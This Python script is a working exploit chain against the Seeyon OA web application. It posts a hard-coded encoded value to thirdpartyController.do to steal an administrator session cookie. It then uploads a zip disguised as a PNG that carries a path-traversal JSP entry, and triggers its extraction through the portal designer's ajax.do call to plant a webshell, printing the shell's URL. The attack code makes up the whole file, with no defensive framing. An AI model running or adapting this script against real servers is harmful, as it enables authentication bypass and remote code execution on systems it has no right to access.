# coding: utf-8
import requests
import re
import time
import zipfile
import sys

proxy = {'http': '127.0.0.1:8081', 'https': '127.0.0.1:8081'}
shell_name = 'justfortest.jsp'
shell_name_zip = '../justfortest.jsp'

def write_zipfile():

    shell_content = r'<%out.println("Just for test!");%>'
    zf = zipfile.ZipFile('fortest.zip', mode='a', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(shell_name_zip, shell_content)

def seeyon_upload_new(targeturl):

    write_zipfile()
    orgurl = targeturl
    targeturl = orgurl.rstrip('/') + '/seeyon/thirdpartyController.do'
    post = {"method":"access","enc":"TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4","clientPath":"127.0.0.1"}
    response = requests.post(url=targeturl, data=post, proxies=proxy, timeout=5, verify=False)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookies = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookies)
        cookie = cookies['JSESSIONID']
        print("[+] The administrator cookie:", cookie)
        targeturl = orgurl.rstrip('/') + '/seeyon/fileUpload.do?method=processUpload'
        files = [('file1', ('fortest.png', open('fortest.zip', 'rb'), 'image/png'))]
        headers = {'Cookie':"JSESSIONID=%s" % cookie}
        data = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0', 'isEncrypt': "0"}
        response = requests.post(url=targeturl, files=files, data=data, headers=headers, proxies=proxy,timeout=5, verify=False)
        if response.text:
            reg = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
            if len(reg) == 0:
                print("[-] fileurls match failed！")
                exit(0)
            fileid = reg[0]
            targeturl = orgurl.rstrip('/') + '/seeyon/ajax.do'
            datestr = time.strftime('%Y-%m-%d')
            post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + fileid + '%22%5D'
            headers['Content-Type'] = "application/x-www-form-urlencoded"
            response = requests.post(targeturl, data=post, headers=headers, proxies=proxy, timeout=5, verify=False)
            shell_url = orgurl.rstrip('/') + '/seeyon/common/designer/pageLayout/' + shell_name
            if response.status_code == 500 and ("Error on" in response.text):
                print("[+] File Uploaded Successfully！")
                print("[+] Webshell:", shell_url)
                print("[+] Please enjoy it！")
            else:
                print("[-] Failed to upload file！")

    else:
        print("[-] Failed to get administrator cookie！")

def main():

    if(len(sys.argv) == 2):
        url = sys.argv[1]
        seeyon_upload_new(url)
    else:
        print("python3 seeyon_check_zip_upload.py [url=http://x.x.x.x]http://x.x.x.x[/url]")

if __name__ == '__main__': 
    main() 